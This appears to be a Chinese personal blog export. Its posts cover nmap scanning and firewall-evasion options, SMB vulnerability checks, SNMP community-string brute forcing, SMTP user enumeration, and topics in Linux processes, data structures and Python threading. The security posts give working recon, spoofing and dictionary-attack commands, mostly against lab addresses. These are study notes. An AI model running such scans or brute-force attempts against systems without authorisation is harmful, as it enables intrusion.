端口发现 SCAN TECHNIQUES(扫描技术)-sS/sT/sA/sW/sM 基于TCP的端口发现TCP SYN/Connect()/ACK/Window/Maimon scans基于TCP的SYN/全连接/ACK/窗口/Maimon 扫描 -sU 基于UPD协议的扫描但是UDP的扫描的准确率并不高 -sN/sF/sX 基于TCP的空/finish/xmas的扫描TCP Null, FIN, and Xmas scans –scanflags Customize TCP scan flags其实以上对于TCP的扫描都是对tcpflags位的组合，所以我们自然是可以自定义组合的。 -sI 僵尸扫描: Idle scan -sY/sZ 基于SCTP协议(少用)SCTP INIT/COOKIE-ECHO scans -b 基于FTP的中继扫描: FTP bounce scan 0x04 指定端口和扫描菜单PORT SPECIFICATION AND SCAN ORDER -p 扫描特定类型端口/范围: Only scan specified portsEx: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 –exclude-ports 排除不需扫描的端口范围: Exclude the specified ports from scanning -F 快速扫描Fast mode - Scan fewer ports than the default scan -r 按顺序扫描Scan ports consecutively - don’t randomize如果我们对1-1000个端口发起扫描，namp默认会在每次扫描中随机选择，-r会使namp按照从大到小的顺序进行。 –top-ports 只扫描常用端口的top nScan most common ports 0x05 服务/版本探测SERVICE/VERSION DETECTION -sVProbe open ports to determine service/version info-sV会使用nmap中的大量特征库去进行探测比对 –version-intensity: Set from 0 (light) to 9 (try all probes)虽然-sV会nmap会调用自身大量的特征库资料去进行匹配，但是这样势必会增加比对的时间成本，所以我们可以探测阶段扫描的强度去最大限度的节省扫描的时间成本。 –version-traceShow detailed version scan activity (for debugging)对扫描过程进行跟踪，显示扫描的具体过程 0x06 SCRIPT SCAN 脚本扫描-sC: equivalent to –script=default–script=: is a comma separated list of directories, script-files or script-categories具体的脚本文件 –script-args=provide arguments to scripts脚本扫描的参数 –script-traceShow all data sent and received脚本扫描追踪 –script-updatedbUpdate the script database.更新nmap脚本库中的文件 –script-help=Show help about scripts. is a comma-separated list of script-files or script-categories.脚本帮助文件，但对于一个陌生脚本时可以使用–script-help来查看该文件的使用说明 1root@kali:/usr/share/nmap/scripts# nmap --script-help=http-xssed.nse 0x07 OS DETECTION 操作系统检测-OEnable OS detection启用操作系统检测 –osscan-limitLimit OS detection to promising targets限制操作系统的检测，比如只发现Linux的或者，Windows的。 0x08 时间和性能TIMING AND PERFORMANCE由于nmap的强大，甚至有时会带来破坏性的扫描，因此很容易被主机发现，此时我们有必要限制nmap的扫描性能。当然也能最大限度的开放nmap的扫描性能。 Options which take are in seconds, or append ‘ms’ (milliseconds), ‘s’ (seconds), ‘m’ (minutes), or ‘h’ (hours) to the value (e.g. 30m). -T: Set timing template (higher is faster) –min-hostgroup/max-hostgroup Parallel host scan group sizes指定并行扫描的主机数量，每次最大或者最小扫描多少个主机 –min-parallelism/max-parallelism Probe parallelization –max-retries Caps number of port scan probe retransmissions.最大的探测次数 –host-timeout Give up on target after this long超时时间 –scan-delay/–max-scan-delay Adjust delay between probesdelay 扫描探测的延时时间/间隔时间 –min-rate Send packets no slower than per second每秒发包数不少于多少 –max-rate Send packets no faster than per second每秒发包数不多于多少 0x09 防火墙躲避/欺骗FIREWALL/IDS EVASION AND SPOOFING -f –mtu fragment packets (optionally w/given MTU)设置MTU之 -D Cloak a scan with decoys伪造源地址，但并不是正真的源地址，而是增加一些噪声源，用以迷惑目标ip，增加对方的分析难度。如果你始终都会发现我的话，我也会挣扎一下的，就像真假悟空一样。 -S -e -Pn 源地址ip伪造-S : Spoof source address-e : Use specified interface-Pn :防火墙扫描使用指定源地址伪造源地址ip 1root@kali:~# nmap -S 192.169.1.123 -e eth0 -Pn 192.168.0.1 -g/–source-port Use given port number使用指定的源端口 1root@kali:~# nmap -g10000 192.168.0.1 –proxies Relay connections through HTTP/SOCKS4 proxies如果软件本身不支持代理的话，那么我们只有使用系统代理链了。但，幸运的是nmap本身死支持代理的。 –data Append a custom payload to sent packets添加用户自定义的数据字段,但是字段必须是16进制数。 –data-string Append a custom ASCII string to sent packets添加用户自定义的数据字段 –spoof-mac 欺骗mac地址Spoof your MAC address伪造一个mac地址，以混淆视听 –badsumSend packets with a bogus TCP/UDP/SCTP checksum差错校验值]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[防火墙识别]]></title>
      <url>%2F2016%2F06%2F12%2F%E9%98%B2%E7%81%AB%E5%A2%99%E8%AF%86%E5%88%AB%2F</url>
      <content type="text"><![CDATA[防火墙:依照特定的规则，允许或是限制传输的数据通过。那么我们扫描防火墙的目的便是，通过发送特定规则的数据包，识别防火墙过滤了哪些端口，而不是防火墙开放了哪些端口。再通过分析返回的信息去判断该防火墙究竟属于什么防火墙。 当是由于设备的多种多样，扫描的结果是会存在一定误差的。 未完待续。。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(3)Linux多线程与同步]]></title>
      <url>%2F2016%2F06%2F11%2F(3)Linux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%90%8C%E6%AD%A5%2F</url>
      <content type="text"><![CDATA[0x00 多线程我们已经知道了程序在内存中的表示。程序在整个运行过程中，只有一个控制权的存在，即激活函数(active)。此外，其它的函数都处于离场状态，并不运行。直到激活函数运行完成以后，控制权才会移交给下一个函数。各个函数就像连在一条线上一样，计算机也只会依次执行各个函数中定义的操作。这样的程序叫做单线程程序。 而多线程允许在一个进程空间中存在多个控制权，以便让多个函数同时处于激活状态，从而让多个函数的操作同时运行。 对于单cpu的计算机，可以通过不停的在不同线程的指令间切换，从而达到多线程同时运行的效果。 然而由于栈的限制，一个栈，只有最下方的帧可被读写。相应的，也只有该帧对应的那个函数被激活。为了实现多线程，必须绕开这种限制。为此，创建一个新的线程时，我们为这个线程建一个新的栈。每个栈对应一个线程。当某个栈执行到全部弹出时，对应线程完成任务。那么，多线程的进程在内存中便会有多个栈。 栈与栈之间以一定的空白区域隔开，以备栈的增长。每个线程可调用自己栈最下方的帧中的参数和变量，并与其它线程共享内存中的Text，heap和global data区域。 值得注意的是，对于多线程来说，由于同一个进程空间中存在多个栈，那么当任何一个空白区域被填满都会导致stack overflow。 0x01 并发多线程相当于以并发(concunrrency)系统。并发系统一般同时执行多个任务。如果多个任务可以共享资源，特别是同时写入某个变量的时候，就需要解决同步的问题。 在并发情况下，指令执行的先后顺序由内核决定。同一个线程内部，指令按照先后顺序执行，但不同线程之间的指令很难说清除哪一个会先执行。如果运行的结果依赖于不同线程执行的先后的话，那么就会造成竞争条件(race condition)，在这样的状况下，计算机的结果很难预知。我们应该尽量避免竞争条件的形成。最常见的解决竞争条件的方法是将原先分离的两个指令构成不可分隔的一个原子操作(atomic operation)，而其它任务不能插入到原子操作中。 0x02 多线程同步对于多线程程序，同步(synchronization)指在一定的时间内只允许某一个线程访问某个资源 。而在此时间内，不允许其它的线程访问该资源。我们可以通过互斥锁(mutex)\，条件变量(condition variable)\和读写锁(reader-writer lock)来同步资源。 互斥锁互斥锁是一个特殊的变量，一般被设置成全局变量，它有锁上(lock)\和打开(unlock)两个状态。打开的互斥锁可以由某个线程获得。一旦获得，这个互斥锁会锁上，此后只有该线程有权打开。其它想要获得互斥锁的线程，会等待直到互斥锁再次打开的时候。 所以线程在lock与unlock之间操作时，不会别其它的线程影响，由此便构成了一个原子操作。 条件变量条件变量是另一种常用的变量。它也常常被保存为全局变量，并和互斥锁合作。 条件变量特别适用于多个线程等待某个条件的发生。如果不使用条件变量，那么每个线程就需要不断尝试获得互斥锁并检查条件是否发生，这样大大浪费了系统的资源。 读写锁读写锁与互斥锁非常相似。RW lock有三种状态: 共享读取锁(shared-read)\,互斥写入锁(exclusive-write lock)\, 打开(unlock)。后两种状态与之前的互斥锁两种状态完全相同。 如果被一个线程获得R锁，RW lock可以被其它线程继续获得R锁，而不必等待该线程释放R锁。但是，如果此时有其它线程想要获得W锁，它必须等到所有持有共享读取锁的线程释放掉各自的R锁。 如果一个锁被一个线程获得W锁，那么其它线程，无论是想要获取R锁还是W锁，都必须等待该线程释放W锁。 这样，多个线程就可以同时读取共享资源。而具有危险性的写入操作则得到了互斥锁的保护。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SMB扫描]]></title>
      <url>%2F2016%2F06%2F10%2FSMB%2F</url>
      <content type="text"><![CDATA[0x00SMB(Server Message Block)协议，服务消息块协议，最开始是用于微软的一种消息传输协议，因为颇受欢迎，现在已经成为跨平台的一种消息传输协议。同时也是微软历史上出现安全问题最多的协议。它的实现复杂，并且默认在所有windows上开放。 0x01 nmap -v smb扫描{ Usage $: ➜ ~ nmap -v -p port hosts } 1➜ ~ nmap -v -p139,445 192.168.0.105 SMB常用的端口有两个139和445，较新的操作系统会使用445端口。 当然我们不能简单的单凭一个端口就去断定OS一定是windows的。NMAP提供了更高级的扫描方式。 12345678910111213141516root@kali:~# nmap 192.168.86.132 -p139,445 --script=smb-os-discovery.nsePORT STATE SERVICE139/tcp open netbios-ssn445/tcp open microsoft-dsMAC Address: 00:0C:29:10:88:B3 (VMware)Host script results:| smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager)| OS CPE: cpe:/o:microsoft:windows_xp::-| Computer name: my-xp| NetBIOS computer name: MY-XP| Workgroup: WORKGROUP|_ System time: 2016-06-10T18:49:22-07:00 同样上一个机器只是用来发现机器上是否有运行SMB协议的，但仅仅是发现远远不够，我们还可以更高效使用nmap去发现该端口是否有漏洞存在: 1➜ ~ nmap -v -p135,445 --script=smb-check-vulns --script-args=unsafe=1 hosts -Pn 脚本smb-check-vulns对目标进行smb漏洞检查 脚本smb-check-vulns可以携带参数对其进行unsafe扫描 -Pn：尝试绕过防火墙 unsafe将会对目标主机造成较大破坏，需警慎使用。 以上脚本信息都是只针对windows的哦！ 0x02 nbtscannbtscan优势在于可以在同意局域网下进行夸网段扫描，比如主机所在网段为192.168.1.,nbscan可以对192.168.86.所在网段的主机进行扫描。 1root@kali:~# nbtscan -r 192.168.0.1 0x03 enum4linux在linux上枚举出windows的命令，同样可以进行夸网段的扫描，并且扫描返回的信息量比较多。但是它不支持大范围的网路扫描，但是这个不是问题，一个Python脚本就搞定了。 1root@kali:~# enum4linux -a 192.168.86.132]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SNMP扫描]]></title>
      <url>%2F2016%2F06%2F10%2FSNMP%E6%89%AB%E6%8F%8F%2F</url>
      <content type="text"><![CDATA[0x00 SNMP扫描简单网络管理协议扫描，SNMP的客户端通常使用的是162端口，而服务器通常使用的是161端口。有些类似于DHCP协议（基于UDP之上的应用层协议，服务端使用67port，客户端使用68port）了。一个小发现，服务端喜欢使用单数，而客服端会是双数。 当一网络环境已经初具规模时，若是还是使用人工进行网络的管理的，效率会很低的。这是便需要基于SNMAP的网络监控机制，负责监控内部网络的比如网络交换机，服务器，防火墙，cpu，带宽，并发连接数等系统资源。 SNMP无论是对网络管理员还是hacker而言都是信息的金矿宝地。但是很多的网络管理者往往错误的对待SNMP的配置规则，只是简单的以为只要网络连通了边万事大吉了。 比如SNMP的默认配置中会使用public来作为communicate的默认秘钥。如果是private的话，那便更好玩了，直接更改它的SNMP配置。要是manager，那简直不可想像。。。对于这些简单的SNMP配置，简单的字典爆破就可以搞定了。 0x01 SNMP 的MIB库SNMP的工作原理其实就是通过SNMP的客户端(但是客户端必须先导入对应的MIB库)，然后通过MIB库来获得服务器信息。 国际标准组织制定了一个MIB(Management Information Base) Tree的SNMP查询标准库(树形网络设备管理功能数据库)。通过该库可以查询OS或者服务器的一些常用信息。有的设备商也会有自己的MIB库，如思科等。 0x02 SNMP的服务端在Windows下打开添加删除程序，添加windows组件，管理和监控工具，安装SNMTP服务。然后打开服务，可以看到现在多出了，snmp servers和 snmp中的陷进，一台电脑一旦安装snmp便成为snmp的服务端了，此时我们可以通过客户端对其发起查询请求。若是服务端没有收到查询请求，那么该服务器上关于电脑性能，流量等参数信息是不会主动向外发送的。 但若是我们对snmp的陷阱进行配置，既是对团体主机(目标主机:该主机一般会是一台监控主机)和陷阱目标进行配置，snmp变回将系统性能参数(我的某个进程down了，内存快慢了，我要没电了)发送给该目标主机。 再来看看snmp的安全选项，这是我们最感兴趣的选项，向吸血鬼闻到血一般，毫无抗拒之力，哈哈。 首先snmp,安全选项的默认设置本身就是不安全的，因为他允许接收来自任何主机的SNMP数据包。验证信息也是将默认的public\作为communicate。这将会埋下极大的安全隐患。 需要知道的是SNMP使用的明文传输。 0x03 onesixtyoneKali里面也集成了一款常用的MIT查询工具onesixtyone(161)。161是SNMP服务端的端口。但是onesixtyone并没有很强大，会想NMAP般获得大量的信息，onesixtyone主要作用是用于探测目标服务器的communicate是否是基于弱密码的，比如public:1➜ ~ onesixtyone 192.168.0.113 public 若是没有任何返回信息，那么代表目标没有使用mor的commnicate，或者目标没有安装SNMP服务端。 对于第一种情况我们可以结合字典对其进行爆破 { Usage $: onesixtyone -c dict.txt -i hosts -o my.log -w 100} -i hosts:表示待扫描的主机列表。 123456➜ ~ dpkg -L onesixtyone #查询onesixtyone自带的字典信息 /usr/share/doc/onesixtyone/dict.txt➜ ~ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.0.103 -o my.log -w 100 #使用字典对其进行爆破 0x04 snmpwalksnmpwalk可以查询到的系统参数信息将会远远多于161扫描。 { Usage $: snmpwalk host -c communicate -v 2c } -c:表示使用的communicate -v：表示使用的snmpwalk版本，目前有三个版本:1c,2c,3c。 1➜ ~ snmpwalk 192.168.0.113 -c public -v 2c 使用MIB中特定的UID号查询目标主机中的特定信息。1➜ ~ snmpwalk -c public -v 2c 192.168.0.113 uid 0x05 snmapchecksnmpcheck 获得的信息可读性会优于snmapwalk。 1➜ ~ snmpcheck -t hosts 可是使用snmpcheck -h查询更多使用方式，]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SMTP扫描]]></title>
      <url>%2F2016%2F06%2F10%2FSMTP%E6%89%AB%E6%8F%8F%2F</url>
      <content type="text"><![CDATA[0x00 SMTPSMTP扫描最主要的作用是发现目标主机上的邮件账号。 通过主动对目标的SMTP（邮件服务器）发动扫描。 简单点，我们首先可以使用nc去尝试连接目标邮件服务器，然后使用VRFYroot命令探测目标是否有root账号。 0x01 NMAP之SMTP扫描当然在使用NMAP扫描SMTP之前我们需要确认对方SMTP端口已经开放了的，这便需要前期的端口扫描了。 然后我们便可以使用NMAP调用与之有关的smtp脚本对其进行扫描了。 123root@kali:~# nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args= smtp-enum-users.methods=&#123;VRFY&#125;#返回结果，并没有发现账号|_ Couldn&apos;t find any accounts NMAP中与smtp扫描有光的脚本程序是smtp-enum-users.nse参数:smtp-enum-users.methods={VERY}实际上是指定使用什么方式对其smtp账号进行验证。这里使用能了VERY的方法。 此外我们除了扫描smtp的用户账号之外，还可以扫描smtp是否开放中继，就是可以使用邮件服务器中的账号对任意账号发送邮件。 当然我们自己也可以编写Python脚本扫描SMTP服务器，使用VRFY等方式对验证是否存在我们想要的一些账号。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(1)Linux进程基础]]></title>
      <url>%2F2016%2F06%2F09%2F(1)Linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80%2F</url>
      <content type="text"><![CDATA[0x01 程序与进程程序(program)是由指令(instruction)构成，通过程序我们可以让计算机完成复杂的操作。 在Linux中，所有的进程都是通过对init进程的fork建立的。当计算机启动时，内核(kerner)只会建立一个init进程。新的进程主要通过老的进程复制自身得到，这就是for机制。 fork通常作为一个函数被调用。这个函数会有两个返回，将子进程的PID返回给父进程，0返回给子进程。 0x01 子进程的终结当子进程终结时，它会通知父进程，清空自己所占据的内存，并在kernel里留下自己的退出信息(exit code，如果顺利运行，则返回0；如果有错误或异常状况，为&gt;0的整数)。之后父进程对该子进程使用wait调用，wait能取出子进程的退出信息，并清空该信息在kernel中所占据的空间。 但是当父进程早于子进程终结时，子进程就会成为一个孤儿进程。此时子进程会过继给init进程。 不同于Unix，在Linux中，线程只是一种特殊的进程，多个线程之间可以共享内存空间和I/O接口。但进程是Linux程序的唯一实现方式。 0x02 Linux信号出于进程的保护机制，进程之间是不会相互干扰的。但有时，进程之间的相互通信确是必要的。信号(singal)就是一种向进程传递信息的方式。不同于其它的进程间通信(interprocess communication，如:pipe,shared memory)，signal所能传递的信息比较粗糙，只是一个整数，但也因此而易于对signal进行管理。 signal通常用于系统管理相关的任务，比如通知进程终结，暂停或者恢复。 信号由内核管理，所以信号的传递是需要通过内核来完成的。内核对每一进程都有一个表存储相关的进程信息。当内核需要将信号传递给某个进程时，就在该进程相对应的表中的适当位置写入信号，这样，就生成(generate)了信号。进程执行系统调用，系统调用完成退出内核时便会查看该表。若有信号，则执行对应该信号的操作(signal action,也叫信号处理:signal disposition),此时叫做执行(deliver)信号 。从信号的生成到信号的传递时间，信号处于等待状态(pending)(未查看表)。我们可以设计程序，让其生成的进程阻塞(block)某些信号，即让这些信号始终处于pending状态，直到取消阻塞(unblock)或者无视信号。 0x03 Linux中的常见信号Linux中常见的信号有SIGINT，SIGQUIT，SIGCONT，SIGTSTP，SIGALRM等。 SIGINT: 当键盘按下CTRL+C从shell中发出信号，信号被传递给shell中前台运行的进程，对应该信号的默认操作是中断 (INTERRUPT) 该进程。 SIGQUIT 当键盘按下CTRL+\从shell中发出信号，信号被传递给shell中前台运行的进程，对应该信号的默认操作是退出 (QUIT) 该进程。 SIGTSTP 当键盘按下CTRL+Z从shell中发出信号，信号被传递给shell中前台运行的进程，对应该信号的默认操作是暂停 (STOP) 该进程。 SIGCONT 用于通知暂停的进程继续。 SIGALRM 起到定时器的作用，通常是程序在一定的时间之后才生成该信号。 0x03 信号处理(signal disposition)进程决定执行信号时，有下面几种可能: 无视(ignore)信号，信号被清除，进程本身不采取任何特殊的操作 默认(default)操作。每个信号对应有一定的默认操作。比如上面SIGCONT用于继续进程。 自定义操作。也叫做获取 (catch) 信号。执行进程中预设的对应于该信号的操作。 进程会采取哪种操作，要根据该进程的程序设计。特别是获取信号的情况，程序往往会设置一些比较长而复杂的操作(通常将这些操作放到一个函数中)。 0x04 进程组与会话 进程组每个进程都会属于一个进程组，每个进程组都会包含多个进程。进程组都有一个进程领导进程组(process group leader),领导进程的PID成为进程组的ID(process group ID,PGID),以识别进程组。 1$ ps -o pid,pgid,ppid,comm | cat 将进程归为进程组的一个原因是我们可以将信号发送个一个进程组。而进程组中的所有进程都会收到该信号。 会话多个进程组还可以构成一个会话(session),bash(Bourne-Again shell)支持工作控制(job control),而sh(Bourne shell)并不支持。 会话是由进程组中的进程建立的，该进程叫做会话的领导进程(session leader)。会话领导进程的PID成为识别会话的SID(session ID)。会话中的每一个进程组称为一个工作(jod), 会话可以有一个进程组成为会话的前台工作(foreground),而其它的进程组是后台工作(background)。每个会话可以连接一个终端(control terminal)。当控制终端有输入输出时，都传递给该会话的前台进程组。 会话的意义在于将多个工作囊括在一个终端，并取其中的一个工作作为前台，来直接接收该终端的输入输出以及终端信号。 其他工作在后台运行。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(2)Linux进程空间]]></title>
      <url>%2F2016%2F06%2F08%2F(2)Linux%E8%BF%9B%E7%A8%8B%E7%A9%BA%E9%97%B4%2F</url>
      <content type="text"><![CDATA[0x00 关于进程空间 进程空间 描述 Stack 存放局部变量 Unused Area 未使用区域 Heap 存放动态变量(dynaminc variable ,比如:malloc直接从内存中为dynamic variable开辟空间) Global Data 存放全局变量 Text(instruction codes) 存储指令 栈(stack)\以帧(stack frame)为单位。当程序调用函数的时候，比如main函数中调用程序中的子函数，stack会向下增长一帧。帧中存储该子函数的参数和局部变量，以及该子函数的返回地址(return address)。此时，计算机将控制权从main()转移到子函数，子函数处于激活(active)状态。位于栈最下方的帧，和全局变量一起，构成了当前的环境(context)。激活函数可以从环境中调用需要的变量。当函数又进一步调用另一个函数的时候，一个新的帧会继续增加到栈的下方，控制权转移到新的函数中。当激活函数返回的时候，会从栈中弹出(pop，读取并从栈中删除)该帧，并根据帧中记录的返回地址，将控制权交给返回地址所指向的指令。 在C语言中，当程序中使用malloc的时候，堆(heap)会向上增长，其增长的部分就成为malloc从内存中分配的空间。malloc开辟的空间会一直存在，直到我们用free系统调用来释放，或者进程结束。一个经典的错误是内存泄漏(memory leakage), 就是指我们没有释放不再使用的堆空间，导致堆不断增长，而内存可用空间不断减少。 栈和堆的大小则会随着进程的运行增大或者变小。当栈和堆增长到两者相遇时候，也就是内存中的未使用区域(unused area)完全消失的时候，再无可用内存。进程会出现栈溢出(stack overflow)的错误，导致进程终止。 0x01 进程附加信息内核会为每个进程在内核自己的空间中分配一变量(task_struct结构体)以保存进程的附加信息,比如PID,PPID,PGID等，这些信息用于说明进程的身份，进程关系以及其它的统计信息。 内核可以通过查看自己空间中的各个进程的附加信息就能知道进程的概况，而不用进入到进程自身的空间。 0x02 fork &amp;&amp; exec当一个程序调用fork的时候，实际上就是将上面的内存空间，包括text, global data, heap和stack，又复制出来一个，构成一个新的进程，并在内核中为该进程创建新的附加信息 (比如新的PID，而PPID为原进程的PID)。此后，两个进程分别地继续运行下去。新的进程和原有进程有相同的运行状态,我们只能通过进程的附加信息来区分两者。 然后程序调用exec，进程清空自身内存空间的text, global data, heap和stack，并根据新的程序文件重建text, global data, heap和stack (此时heap和stack大小都为0)，并开始运行。 本文参考来源:http://www.cnblogs.com/vamei/archive/2012/10/09/2715388.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Kali之Rolling-realease]]></title>
      <url>%2F2016%2F06%2F08%2FKali%E4%B9%8BRolling-realease%2F</url>
      <content type="text"><![CDATA[从Kali 2.0 rolling 版本采用debian testing库作为更新源，默认Gnome 3.18，Linux 4.3的内核。同时，Kali官方发布了一个软件包的跟踪网站 http://pkg.kali.org， 通过这个网站我们可以对kali中的一些软件进行历史追溯。所以当Kali默认系统中的软件不存在时，我们可以到kali的官网去下载安装了。 对于VMware的虚拟机，我们可以不用再去安装VMware的VMware Tools工具，而是可以直接使用Kali官方发布的Open-VM-Tools： 1$: apt-get install open-vm-tools-desktop fuse 安装完成以后可以使用lsb_release -a查看系统性能。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(10)-堆之队列优化]]></title>
      <url>%2F2016%2F06%2F05%2F(10)-%E5%A0%86%E4%B9%8B%E9%98%9F%E5%88%97%E7%9A%84%E4%BC%98%E5%8C%96%2F</url>
      <content type="text"><![CDATA[0x00 堆堆是一种特殊的完全二叉树，只是在存储和构建这个完全二叉树的时候我们给这些数据进行了一个从小到大(所有父节点都比子节点要小，我们称为最小堆)或者(从大到小的排序，我们称为最大堆)，而已。 堆的特性方便于我们后续对完全二叉树中的数据进行查找。 0x01 最小堆我们要先举个栗子:假如有n个数，我们已经将这个n个数按照最小堆的特性放在了一个完全二叉树中了，那么现在最小的数就在队顶了，假设存储这个堆的数组叫做h，那么最小数就是h[1],现在我们需要删除其中最小的数（堆顶那个数），并增加一个新数k，然后再求这n个数中最小的一个数。 显然加入新树以后，已经不符合最小堆的特性了，这时我便需要对其进行必要的调整，以让其符合最小堆的特性。 方法是向下调整。 0x02 最小堆的向下调整基本思想:为符合最小堆的特性，父节点要小于它的左右子节点，需要将新加入的数依次与它的左右儿子进行比较， 向下调整的代码: 12345678910111213141516171819202122232425262728293031void siftdown(int i)//传入一个需要向下调整的节点编号，这里传入1 //，既从堆的顶点开始&#123; int t,flag=0;//flag用来标记是否需要继续向下调整 //当i节点有儿子（最少存在左儿子），并且有向下调整的必要时，执行循环体 while(i*2&lt;=n &amp;&amp; flag==0) &#123; //首先判断i和左儿子的关系，并用t记录较小值的节点编号 if(h[i]&lt;h[i*2]) t=i; else t=i*2; //如果还存在右儿子，则继续比较 if(i*2+1&lt;=n) &#123; //若是右儿子的值更小，更新较小的节点编号 if(h[t]&lt;h[i*2+1]) t=i*2+1 &#125; //若是发现最小的编号不是自己，则说明子节点中有比父节点更小的 if(t!=i) &#123; swap(t,i);//交换它们 i=t;//更新i，便于接下来继续向下调整 &#125; else flag=1;//说明当前的父节点已 //经比两个子节点都要小了，不再调整 &#125; &#125; 整个算法的时间复杂度是O（logN）。 0x03 最小堆的向上调整那么，若是想直接在原有的堆上直接插入一个新的数呢？只需要直接将新元素插入到末尾，再根据情况判断新元素是否需要上移，直到满足堆的特性为止。如果堆的大小为N（即有N个元素），那么插入一个新元素所需要的时间也是O(logN)。 向上调整的代码： 1234567891011121314151617void siftup(int i)//传入一个需要向上调整的节点编号i&#123; int flag=0;//用来标记是否需要继续向上调整 if(i==1) return;//若是堆顶，则返回，不需要调整了 //不在堆顶，并且当前节点i的值比父节点小的时候继续向上调整 while(i!=1 &amp;&amp; flag==0) &#123; //判断是否比父节点小 if(h[i]&lt;h[i/2]) swap(i,i/2); else flag=1;//表示当前节点的值比父节点的值要大，不需要调整了 i=i/2；//更新i为它父节点的编号，便于下一此的向上调整 &#125;&#125; 0x04 最小堆的建立把n个元素建立一个堆，首先我可以将这n个结点以自顶向下、从左到右的方式从1到n编码。这样就可以把这n个结点转换成为一棵完全二叉树。紧接着从最后一个非叶结点（结点编号为n/2）开始到根结点（结点编号为1），逐个扫描所有的结点，根据需要将当前结点向下调整，直到以当前结点为根结点的子树符合堆的特性。 注意完全二叉树有一个性质：最后一个非叶结点是第n/2个结点。 12for(i=n/2;i&gt;=1;i--) siftdown(i); 用这种方法来建立一个堆的时间复杂度是O(N)。 堆可以用在堆排序中，与快排的时间复杂度一样为O(NlogN)。对于堆排序，我只需要先建立最小堆，然后每次删除顶部元素并将顶部元素输出或者放入一个新的数组中，直到堆为空为止，最后输出或者存发在数组中的数便已经是排好序的。 12345678910//删除最大元素int deletemax()&#123; int i; t=h[1];//临时变量用于记录堆顶点的值 h[1]=h[n];//将堆的最后一个顶点赋值到堆顶 n--；//堆元素减1 siftdown(1);向下调整 return t；返回之前记录的堆顶点的最大值&#125; 0x05 堆的建立以及堆排序]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[(8)树-二叉树-完全二叉树]]></title>
      <url>%2F2016%2F06%2F05%2F(9)%E6%A0%91-%E4%BA%8C%E5%8F%89%E6%A0%91-%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%2F</url>
      <content type="text"><![CDATA[0x00 树的概念树其实不包含回路的连通无向图。 一棵树的任意两个节点之间有且仅有唯一的一条路径连通。 一棵树如果有n个节点，那么它一定有n-1条边。 一棵树可以有多种形态，所以为了确定数的形态，规定每一颗数都要有一个根节点。 0x01 关于二叉树二叉树是一种特殊结构的树，它的每个节点最多有两颗子树。 二叉树中又有两种特殊的二叉树: 1)满二叉树:如果一棵树深度为h其有2h-1个节点的二叉树，就是说二叉树中每个内部节点都有两个儿子; 2)完全二叉树:若设二叉树的高度是h，除第h层外，其它各层(1~h-1)的节点数都达到最大个数，第h层从右向左连续缺若干节点，即使完全二叉树； 0x02 深入理解完全二叉树完全二叉树中父亲节点和子节点之间有着神奇的关系。 首先将完全二叉树才从上到下，从左到右编号。 1 2 3 4 5 6 由上可以发现: 1)如果一个父节点的编号为k，那么它的左儿子的编号就是2k,右儿子的编号就是2k+1; 2)如果已知儿子(无论左右)编号为x，那么它的父节点的编号就是x/2，求模运算(向下取整); 3)当一颗完全二叉树有N个节点时，那么这个完全二叉树的高度为logN(以2为底)，就是说最多有logN层节点。 完全二叉树最典型的应用堆，可以用于优化队列。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python标准库(8)-threading包-多线程]]></title>
      <url>%2F2016%2F06%2F04%2FPython%E6%A0%87%E5%87%86%E5%BA%93(8)-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%90%8C%E6%AD%A5(threading%E5%8C%85))%2F</url>
      <content type="text"><![CDATA[0x00 OOP创建线程Python主要通过标准库中的threading包来实现多线程。下面来看一个使用OOP(Object-Oriented programming)的方法实现多线程。 OOP方法的核心是继承threading.Thread类。 1234567891011121314151617181920212223242526272829303132333435363738394041import threading#导入threading包以实现多线程import timeimport osdef doChore(): #doChore相当于额外的函数功能 time.sleep(0.5)class BoothThread(threading.Thread):#BoothThread继承自threading.Thread类 def __init__(self,tid,monitor): self.tid = tid self.monitor =monitor threading.Thread.__init__(self)#由于继承于threading.Thread类，执行初始化时调用父类 def run(self): while True: monitor[&apos;lock&apos;].acquire() #互斥锁，尝试获得锁，加锁或者当其它使用者得到锁时进行等待 if monitor[&apos;tick&apos;] != 0: monitor[&apos;tick&apos;] = monitor[&apos;tick&apos;]-1 print(self.tid, &apos;:now lef:&apos;, monitor[&apos;tick&apos;]) doChore() else: print(&quot;Thread_id&quot;, self.tid, &quot;no more tickets&quot;) os.eixt(0) #当tickets售完以后立刻退出 monitor[&apos;lock&apos;].release() #释放锁 doChore()monitor = &#123;&apos;tick&apos;: 100, &apos;lock&apos;: threading.Lock()&#125;#使用一个词典monitor来存放全局变量，由于词典是可变对象，所以当它被传递给函数时，函数使用的依然是同一个对象，#相当于被多个线程所共享，这算是一个多进程乃至多线程的编程的一个技巧。#其中lock是threading.Lock的一个对象for k in range(10): new_thread = BoothThread(k, monitor) new_thread.start() 线程中除了star()方法\和run()方法之外，还有join()方法，调用该方法的线程将等待直到Thread对象完成，在恢复运行，这与进程调用wait()方法是类似的。 对象一旦被建立，就可以被多个线程共享，下面的对象用于处理多线程同步: threading.Lock对象:互斥锁，mutex，有acquire()和release()方法。 threading.Condition对象:conditon variabe和mutex是一起使用的，所以当对象建立时，会包含一个Lock对象。可以对Condition对象调用acquire()和release()方法。 wait()方法:相当于cond_wait() notify_all()方法:相当于cond_broadcast() notify():与notify_all()功能类似，但是只唤醒一个等待的线程，而不是全部。 threading.Semaphore对象，semaphore也就是计数锁。创建对象的时候可以使用一个整数作为一个计数上限，与Lock类似，也有Lock的两个方法。 threading.Event对象: 